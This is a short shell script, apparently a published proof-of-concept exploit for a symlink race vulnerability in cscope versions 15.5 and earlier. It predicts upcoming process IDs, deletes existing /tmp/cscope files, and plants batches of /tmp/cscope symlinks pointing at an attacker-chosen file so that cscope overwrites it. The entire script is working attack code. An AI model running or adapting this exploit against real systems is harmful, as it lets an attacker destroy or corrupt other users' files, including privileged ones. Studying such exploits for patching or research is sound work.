#!/bin/sh
#################################################################
# RXcscope_proof.sh
# brute force case baby
# cscope advisory and exploit by Gangstuck / Psirac <research@rexotec.com>
#################################################################

HOWM=30
CURR=`ps | grep ps | awk '{print $1}'`
NEXT=`expr $CURR + 5 + $HOWM \* 2 + 1`
LAST=`expr $NEXT + $HOWM`

echo -e "\n--= Cscope Symlink Vulnerability Exploitation =--\n"\
        "                 [versions 15.5 and minor]\n"\
        "                   Gangstuck / Psirac\n"\
        "                 <research@rexotec.com>\n\n"

if [ $# -lt 1 ]; then
        echo "Usage: $0 <file1> [number_of_guesses]"
        exit 1
fi

rm -f /tmp/cscope*

echo "Probed next process id ........ [${NEXT}]"

while [ ! "$NEXT" -eq "$LAST" ]; do
        ln -s $1 /tmp/cscope${NEXT}.1; NEXT=`expr $NEXT + 1`
        ln -s $1 /tmp/cscope${NEXT}.2; NEXT=`expr $NEXT + 1`
done

